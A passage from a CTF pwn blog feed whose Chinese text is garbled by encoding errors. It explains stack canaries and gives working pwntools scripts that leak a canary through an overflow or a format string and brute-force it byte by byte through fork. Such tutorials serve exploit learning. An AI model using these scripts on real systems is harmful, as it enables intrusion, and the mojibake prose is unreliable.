bitæ°¸è¿œæ˜¯1ã€‚åº”ä¸ºfast binä¼šè¢«é¢‘ç¹ä½¿ç”¨ï¼Œæ‰€ä»¥fast binæ˜¯ä¸å‚ä¸åˆå¹¶çš„ï¼Œ</li></ul><hr><p>ä»Šåå­¦åˆ°è¡¥å……è¡¥å……</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3>]]></content>
    
    
    <categories>
      
      <category>å †</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç»•è¿‡ä¿æŠ¤ä¹‹Canary</title>
    <link href="/2024/07/18/%E7%BB%95%E8%BF%87%E4%BF%9D%E6%8A%A4%E4%B9%8BCanary/"/>
    <url>/2024/07/18/%E7%BB%95%E8%BF%87%E4%BF%9D%E6%8A%A4%E4%B9%8BCanary/</url>
    
    <content type="html"><![CDATA[<h1 id="åˆè¯†Canary"><a href="#åˆè¯†Canary" class="headerlink" title="åˆè¯†Canary"></a>åˆè¯†Canary</h1><p><strong>å…³äºcanaryè¯´ç™½äº†å°±æ˜¯ä¸€ä¸ªé˜²æ­¢æ ˆæº¢å‡ºçš„æ‰‹æ®µï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯åœ¨æ ˆåº•å‰è¾¹è®¾ç½®ä¸€ä¸ªå€¼ï¼Œåœ¨è¿›ç¨‹ç»“æŸæ—¶ï¼Œå¯¹æ¯”è¿™ä¸ªå€¼æœ‰æ²¡æœ‰è¢«ç¯¡æ”¹ï¼Œå¦‚æœç¯¡æ”¹å°±é€€å‡ºã€‚å…·ä½“æ±‡ç¼–å¦‚ä¸‹</strong><br><strong>å‡½æ•°å¼€å§‹å‰åœ¨å‡½æ•°åºè¨€éƒ¨åˆ†ä¼šå– fs å¯„å­˜å™¨ 0x28 å¤„çš„å€¼ï¼Œå­˜æ”¾åœ¨æ ˆä¸­ rbp-0x8 çš„ä½ç½®(32ä½ebp-0x4ã€‚ä½†æ˜¯è¿™ä¸ªä½ç½®ä¸æ˜¯ç»å¯¹çš„ï¼Œå¯ä»¥é€šè¿‡idaåˆ†æ)ã€‚ è¿™ä¸ªæ“ä½œå³ä¸ºå‘æ ˆä¸­æ’å…¥ Canary å€¼</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mov    rax, qword ptr fs:[0x28]<br>mov    qword ptr [rbp - 8], rax<br></code></pre></td></tr></table></figure><p><strong>å‡½æ•°ç»“æŸæ—¶ï¼Œä¼šå°†è¯¥å€¼å–å‡ºï¼Œå¹¶ä¸ fs:0x28 çš„å€¼è¿›è¡Œå¼‚æˆ–ã€‚å¦‚æœå¼‚æˆ–çš„ç»“æœä¸º 0ï¼Œè¯´æ˜ Canary æœªè¢«ä¿®æ”¹ï¼Œå‡½æ•°ä¼šæ­£å¸¸è¿”å›ï¼Œè¿™ä¸ªæ“ä½œå³ä¸ºæ£€æµ‹æ˜¯å¦å‘ç”Ÿæ ˆæº¢å‡º</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">mov    rdx,QWORD PTR [rbp-0x8]<br>xor    rdx,QWORD PTR fs:0x28<br>je     0x4005d7 &lt;main+65&gt;<br>call   0x400460 &lt;__stack_chk_fail@plt&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182346584.png"></p><p><strong>å¦‚æœ Canary å·²ç»è¢«éæ³•ä¿®æ”¹ï¼Œæ­¤æ—¶ç¨‹åºæµç¨‹ä¼šèµ°åˆ° __stack_chk_failã€‚__stack_chk_fail ä¹Ÿæ˜¯ä½äº glibc ä¸­çš„å‡½æ•°ï¼Œé»˜è®¤æƒ…å†µä¸‹ç»è¿‡ ELF çš„å»¶è¿Ÿç»‘å®šï¼Œè¿™ä¸ªå‡½æ•°ä¸åŒçš„libcä¼šä¸åŒï¼ˆä»glibcå¼€å§‹ 2.27åç¨æœ‰ä¸åŒï¼‰å®šä¹‰å¦‚ä¸‹</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">eglibc<span class="hljs-number">-2.19</span>/debug/stack_chk_fail.c<br><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __stack_chk_fail (<span class="hljs-type">void</span>)<br>&#123;<br>  __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) internal_function __fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>åœ¨æ²¡æœ‰å¼€å¯FULL RELROä¿æŠ¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ«æŒGOTè¡¨ï¼Œç„¶åè§¦å‘Canaryæ£€æµ‹æŠ¥é”™ï¼Œè¿™æ—¶å°±ä¼šè¿›å…¥åŠ«æŒçš„åœ°å€ã€‚å¦ä¸€ç§æ˜¯åˆ©ç”¨fortify_failå‡½æ•°æ‰“å°å…³é”®ä¿¡æ¯</strong><br><strong>å…³äºCanaryçš„å‚¨å­˜åœ°å€ï¼Œå¯¹äºLiunxæ¥è¯´ï¼Œfså¯„å­˜å™¨å®é™…æŒ‡å‘çš„æ˜¯å½“å‰è¿›ç¨‹çš„TLSç»“æ„ï¼Œfsï¼š0x28æŒ‡å‘çš„æ­£å¼stack_guardã€‚å¦‚æœæº¢å‡ºæ¡ä»¶åˆé€‚ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥è¦†ç›–TLSä¸­ä¿å­˜çš„Canaryå€¼</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">void</span> *tcb;        <span class="hljs-comment">/* Pointer to the TCB.  Not necessarily the</span><br><span class="hljs-comment">                       thread descriptor used by libpthread.  */</span><br>  <span class="hljs-type">dtv_t</span> *dtv;<br>  <span class="hljs-type">void</span> *self;       <span class="hljs-comment">/* Pointer to the thread descriptor.  */</span><br>  <span class="hljs-type">int</span> multiple_threads;<br>  <span class="hljs-type">uintptr_t</span> sysinfo;<br>  <span class="hljs-type">uintptr_t</span> stack_guard;<br>  ...<br>&#125; <span class="hljs-type">tcbhead_t</span>;<br></code></pre></td></tr></table></figure><p><strong>è¿™ä¸ªå€¼ç”±ssecurity_initå‡½æ•°æ¥åˆå§‹åŒ–</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">security_init</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-comment">// _dl_randomçš„å€¼åœ¨è¿›å…¥è¿™ä¸ªå‡½æ•°çš„æ—¶å€™å°±å·²ç»ç”±kernelå†™å…¥.</span><br>  <span class="hljs-comment">// glibcç›´æ¥ä½¿ç”¨äº†_dl_randomçš„å€¼å¹¶æ²¡æœ‰ç»™èµ‹å€¼</span><br>  <span class="hljs-comment">// å¦‚æœä¸é‡‡ç”¨è¿™ç§æ¨¡å¼, glibcä¹Ÿå¯ä»¥è‡ªå·±äº§ç”Ÿéšæœºæ•°</span><br><br>  <span class="hljs-comment">//å°†_dl_randomçš„æœ€åä¸€ä¸ªå­—èŠ‚è®¾ç½®ä¸º0x0</span><br>  <span class="hljs-type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);<br><br>  <span class="hljs-comment">// è®¾ç½®Canaryçš„å€¼åˆ°TLSä¸­</span><br>  THREAD_SET_STACK_GUARD (stack_chk_guard);<br><br>  _dl_random = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">//THREAD_SET_STACK_GUARDå®ç”¨äºè®¾ç½®TLS</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span><br><span class="hljs-meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></code></pre></td></tr></table></figure><p><strong>Canaryçš„æœ€åä¸€ä¸ªå­—èŠ‚å‘—è®¾ç½®ä¸º0ï¼Œé˜²æ­¢ç±»ä¼¼ä¸printf(â€œ%sâ€ , &amp;buf)ï¼Œå½¢å¼çš„å‡½æ•°ä¸å°å¿ƒæ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠè¿™ä¸ª0ç»™è¦†ç›–ï¼Œç”¨æ‰“å°å‡½æ•°æ¥è¦†ç›–ï¼Œè¿™æ ·å°±æ³„éœ²äº†Canaryçš„å€¼</strong></p><h1 id="Canaryä¿æŠ¤æœºåˆ¶æ€»ç»“"><a href="#Canaryä¿æŠ¤æœºåˆ¶æ€»ç»“" class="headerlink" title="Canaryä¿æŠ¤æœºåˆ¶æ€»ç»“"></a>Canaryä¿æŠ¤æœºåˆ¶æ€»ç»“</h1><ol><li><strong>_dl_randomç”±Kernelå†™å…¥</strong></li><li><strong>security_init å‡½æ•°å°†_dl_random çš„æœ€åä¸€ä¸ªå­—èŠ‚è®¾ç½®ä¸º0ï¼Œé˜²æ­¢ printf(â€œ%sâ€)è¿™ç±»æ‰“å°å‡½æ•°ä¸å°å¿ƒæ³„éœ² Canaryã€‚</strong></li><li><strong>security_init å‡½æ•°å°† Canary å€¼è®¾ç½®åˆ° TLS ä¸­ã€‚</strong></li><li><strong>åœ¨å‡½æ•°å¼€å§‹æ—¶ï¼Œä¼šå–å‡ºTLSä¸­çš„Canaryå€¼æ”¾åœ¨ebp-4h(64ä½ç³»ç»Ÿä¸ºrbp-8h)<br>ä¸­ï¼Œå³é˜²æ­¢é€šè¿‡æ ˆæº¢å‡ºä¿®æ”¹ ebp å’Œè¿”å›åœ°å€ã€‚</strong></li><li><strong>åœ¨å‡½æ•°ç»“æŸæ—¶ï¼Œä¼šå–å‡ºebp-4h(64ä½ç³»ç»Ÿä¸ºrbp-8h)çš„å€¼ï¼Œå¹¶ä¸ TLS ä¸­çš„ Canarå€¼è¿›è¡Œå¼‚æˆ–ï¼Œåˆ¤æ–­æ˜¯å¦ä¸º0ã€‚è‹¥ç»“æœä¸º0ï¼Œåˆ™æ£€æŸ¥é€šè¿‡;è‹¥ç»“æœä¸ä¸º0ï¼Œåˆ™æ£€æŸ¥ä¸é€šè¿‡ï¼Œè¿›äººstack_chk_fail å‡½æ•°</strong></li></ol><h2 id="Canaryä¿æŠ¤æœºåˆ¶ä¸»è¦æœ‰ä¸¤ä¸ªæ¼æ´"><a href="#Canaryä¿æŠ¤æœºåˆ¶ä¸»è¦æœ‰ä¸¤ä¸ªæ¼æ´" class="headerlink" title="Canaryä¿æŠ¤æœºåˆ¶ä¸»è¦æœ‰ä¸¤ä¸ªæ¼æ´"></a>Canaryä¿æŠ¤æœºåˆ¶ä¸»è¦æœ‰ä¸¤ä¸ªæ¼æ´</h2><ul><li><strong>stack_chk_fai1å‡½æ•°ä¼šæœ‰ä¿¡æ¯è¾“å‡ºï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ libc_argv[0]ï¼Œå°±èƒ½å¤Ÿé€šè¿‡stack_chk failå‡½æ•°æ³„éœ²å‡ºæˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ï¼Œè¿™ä¸ªæŠ€æœ¯è¢«ç§°ä¸º stacksmashes(glibc 2.27 å’Œ 2.27ä¹‹åçš„ç‰ˆæœ¬ä¼šæœ‰ä¸€äº›å˜åŒ–)ã€‚</strong></li><li>å¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªå¾ˆé•¿çš„æ ˆæº¢å‡ºï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥æº¢å‡ºTLS ä¸­çš„ a1_random çš„å€¼ï¼Œå› æ­¤å¯ä»¥ç»•è¿‡ Canary ä¿æŠ¤ã€‚å½“ç„¶ï¼Œè¿™é‡Œå¯èƒ½è¿˜éœ€è¦ä¸€ä¸ªå¤šçº¿ç¨‹çš„æ¡ä»¶ï¼Œå¯ä»¥åœ¨åç»­ä¾‹<br>é¢˜ä¸­çœ‹åˆ°ã€‚</li></ul><h2 id="å¯¹äºæœ‰Canaryçš„ç¨‹åºï¼Œå¦‚æœè€ƒè™‘æ ˆæº¢å‡ºæ”»å‡»ï¼Œä¸»è¦æœ‰å››ä¸ªæ”»å‡»ç‚¹ï¼š"><a href="#å¯¹äºæœ‰Canaryçš„ç¨‹åºï¼Œå¦‚æœè€ƒè™‘æ ˆæº¢å‡ºæ”»å‡»ï¼Œä¸»è¦æœ‰å››ä¸ªæ”»å‡»ç‚¹ï¼š" class="headerlink" title="å¯¹äºæœ‰Canaryçš„ç¨‹åºï¼Œå¦‚æœè€ƒè™‘æ ˆæº¢å‡ºæ”»å‡»ï¼Œä¸»è¦æœ‰å››ä¸ªæ”»å‡»ç‚¹ï¼š"></a>å¯¹äºæœ‰Canaryçš„ç¨‹åºï¼Œå¦‚æœè€ƒè™‘æ ˆæº¢å‡ºæ”»å‡»ï¼Œä¸»è¦æœ‰å››ä¸ªæ”»å‡»ç‚¹ï¼š</h2><ol><li><strong>åˆ©ç”¨æ³„éœ²å‡½æ•°æ³„éœ²å‡º Canary çš„å€¼ï¼Œå†è¿›è¡Œåˆ©ç”¨ã€‚</strong></li><li><strong>çˆ†ç ´å¾—åˆ° Canary çš„å€¼ã€‚</strong></li><li><strong>stack_chk fai1 å‡½æ•°æ³„éœ²å…³é”®ä¿¡æ¯ã€‚</strong></li><li><strong>ä¿®æ”¹ TLS ä¸­çš„ stack quard å€¼ã€‚</strong></li></ol><h1 id="æ³„éœ²Canaryå€¼"><a href="#æ³„éœ²Canaryå€¼" class="headerlink" title="æ³„éœ²Canaryå€¼"></a>æ³„éœ²Canaryå€¼</h1><p><strong><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/canary/leak_canary">é™„ä»¶ä¸‹è½½</a></strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347433.png"><br><strong>æ³¨æ„ç‚¹Canaryå€¼è·ç¦»ebpä¸º0xcï¼Œç„¶åé€šè¿‡æ ˆæº¢å‡ºè¦†ç›–æœ€åä¸€ä½0ï¼Œé€šè¿‡æ‰“å°å‡½æ•°æ‰“å°å‡ºæ¥cancary</strong></p><ol><li><strong>ç¬¬ä¸€ç§æ˜¯ç”¨æ ˆæº¢å‡ºæ¼æ´</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./leak_canary&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote( )<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(filename)<br><br>target = <span class="hljs-number">0x080485CC</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + <span class="hljs-string">b&#x27;b&#x27;</span><br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span>)<br>canary_addr = u32(p.recv(<span class="hljs-number">4</span>)) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;b&#x27;</span>)<br>success(<span class="hljs-built_in">hex</span>(canary_addr))<br>payload2 = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x100</span> + p32(canary_addr)<br>payload2 += p32(<span class="hljs-number">1</span>) * <span class="hljs-number">3</span><br>payload2 += p32(target)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure></li><li>ç¬¬äºŒç§æ˜¯åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./leak_canary&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote( )<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(filename)<br><br>target = <span class="hljs-number">0x080485CC</span><br>p1 = <span class="hljs-string">&#x27;%&#123;offset&#125;$p\n&#x27;</span>.<span class="hljs-built_in">format</span>(offset = <span class="hljs-number">71</span>)<br><br>p.send(p1)<br>canary_addr = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span> , drop=<span class="hljs-literal">True</span>) , <span class="hljs-number">16</span>)<br><br>success(<span class="hljs-built_in">hex</span>(canary_addr))<br>p2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p32(canary_addr)<br>p2 += <span class="hljs-number">0xc</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>p2 += p32(target)<br><br>p.sendline(p2)<br>p.interactive()<br></code></pre></td></tr></table></figure></li></ol><h1 id="é€å­—èŠ‚çˆ†ç ´Canary"><a href="#é€å­—èŠ‚çˆ†ç ´Canary" class="headerlink" title="é€å­—èŠ‚çˆ†ç ´Canary"></a>é€å­—èŠ‚çˆ†ç ´Canary</h1><p><strong><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/canary/one_by_one_bruteforce">é™„ä»¶ä¸‹è½½</a></strong><br><strong>è¿™ç§æ–¹æ³•å±€é™æ€§æ¯”è¾ƒå¤§ï¼Œå¿…é¡»æœ‰forkå‡½æ•°å¼€å¯å­è¿›ç¨‹ã€‚å› ä¸ºforkå‡½æ•°ä¼šç›´æ¥æ‹·è´çˆ¶è¿›ç¨‹å†…å­˜ï¼Œæ‰€ä»¥åˆ›å»ºçš„å­è¿›ç¨‹canaryéƒ½æ˜¯ç›¸åŒçš„</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347688.png"><br><strong>æˆ‘ä»¬ä¸€ç›´forkå¼€å¯å­è¿›ç¨‹ï¼Œä¸€ä¸ªä¸€ä¸ªå­—èŠ‚çš„çˆ†ç ´</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./one_by_one_bruteforce&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote( )<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruteforce1bit</span>() :<br>  <span class="hljs-keyword">global</span> known<br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    p1 = <span class="hljs-number">0x108</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>    p1 += known<br>    p1 += <span class="hljs-built_in">bytes</span>([i])<br>    p.sendafter(<span class="hljs-string">&#x27;one_by_one_bruteforce\n&#x27;</span>,p1)<br>    <span class="hljs-keyword">try</span> :<br>      info = p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>      <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;*** stack smashing detected ***&quot;</span> <span class="hljs-keyword">in</span> info :<br>        p.send(<span class="hljs-string">&#x27;n\n&#x27;</span>)<br>        <span class="hljs-keyword">continue</span><br>      <span class="hljs-keyword">else</span> :<br>        known += <span class="hljs-built_in">bytes</span>([i])<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span>:<br>        log.info(<span class="hljs-string">&#x27;wrong&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br>      <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bruteforce_canary</span>():<br>  <span class="hljs-keyword">global</span> known<br>  known += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    bruteforce1bit()<br>    <span class="hljs-keyword">if</span> i != <span class="hljs-number">6</span> :<br>      p.send(<span class="hljs-string">b&#x27;n\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span> :<br>      p.send(<span class="hljs-string">b&#x27;y\n&#x27;</span>)<br><br>target = <span class="hljs-number">0x000000000040083E</span><br>known = <span class="hljs-string">b&quot;&quot;</span><br>bruteforce_canary()<br>canary = u64(known)  <span class="hljs-comment"># Ensure known is 8 bytes</span><br>log.success(<span class="hljs-string">&quot;canary: &quot;</span> + <span class="hljs-built_in">hex</span>(canary))<br>p2 = <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">0x108</span> + p64(canary) + p64(<span class="hljs-number">0</span>) + p64(target)<br>p.sendafter(<span class="hljs-string">b&quot;go\n&quot;</span>, p2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>| è¿™ä¸¤ä¸ªç†è§£èµ·æ¥éƒ½å¾ˆç®€å•ï¼Œæ²¡æœ‰ä»€ä¹ˆéš¾ç‚¹ï¼Œçœ‹ç€expå¾ˆå®¹æ˜“ç†è§£</p><h1 id="stack-smashes"><a href="#stack-smashes" class="headerlink" title="stack_smashes"></a>stack_smashes</h1><p><strong><a href="https://gitee.com/tky5216/CTF/raw/master/PWN/canary/stack_smashes">é™„ä»¶ä¸‹è½½</a></strong></p><p><strong>å‰è¾¹å·²ç»ç®€ç»äº†ï¼Œ_stack_chk_failå‡½æ•°ä¼šå°†__libc_agrc[0]çš„ä¿¡æ¯æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ”¹å˜__libc_agrc[0]çš„åœ°å€ä¸ºæˆ‘ä»¬æƒ³è¦ä¿¡æ¯çš„å€¼ï¼Œé‚£ä¹ˆå°±èƒ½å¾—åˆ°ç›¸åº”æ•°æ®äº†</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182347802.png"><br><strong>é¦–å…ˆç®€ç»ä¸€ä¸‹ä»€ä¹ˆæ˜¯__libc_agrc[0]</strong></p><p><strong>main(int argc , char ,*argv[ ])</strong></p><ol><li><strong>argcä¸ºæ•´æ•°</strong></li><li><strong>argvä¸ºæŒ‡é’ˆçš„æŒ‡é’ˆï¼ˆå¯ç†è§£ä¸ºï¼šchar **argv or: char *argv[] or: char argv[][] ï¼Œargvæ˜¯ä¸€ä¸ªæŒ‡é’ˆæ•°ç»„)</strong><br><strong>æ³¨ï¼šmain()æ‹¬å·å†…æ˜¯å›ºå®šçš„å†™æ³•ã€‚</strong></li><li><strong>ä¸‹é¢ç»™å‡ºä¸€ä¸ªä¾‹å­æ¥ç†è§£è¿™ä¸¤ä¸ªå‚æ•°çš„ç”¨æ³•ï¼š</strong><br>**ã€€å‡è®¾ç¨‹åºçš„åç§°ä¸ºprogï¼Œ**<br><strong>å½“åªè¾“å…¥progï¼Œåˆ™ç”±æ“ä½œç³»ç»Ÿä¼ æ¥çš„å‚æ•°ä¸ºï¼š</strong><br><strong>argc&#x3D;1,è¡¨ç¤ºåªæœ‰ä¸€ç¨‹åºåç§°ã€‚</strong><br><strong>argcåªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œargv[0]æŒ‡å‘è¾“å…¥çš„ç¨‹åºè·¯å¾„åŠåç§°ï¼š.&#x2F;prog</strong><br><strong>å½“è¾“å…¥prog para_1ï¼Œæœ‰ä¸€ä¸ªå‚æ•°ï¼Œåˆ™ç”±æ“ä½œç³»ç»Ÿä¼ æ¥çš„å‚æ•°ä¸ºï¼š</strong><br><strong>argc&#x3D;2ï¼Œè¡¨ç¤ºé™¤äº†ç¨‹åºåå¤–è¿˜æœ‰ä¸€ä¸ªå‚æ•°ã€‚</strong><br><strong>argv[0]æŒ‡å‘è¾“å…¥çš„ç¨‹åºè·¯å¾„åŠåç§°ã€‚</strong><br><strong>argv[1]æŒ‡å‘å‚æ•°para_1å­—ç¬¦ä¸²ã€‚</strong><br><strong>å½“è¾“å…¥prog para_1 para_2 æœ‰2ä¸ªå‚æ•°ï¼Œåˆ™ç”±æ“ä½œç³»ç»Ÿä¼ 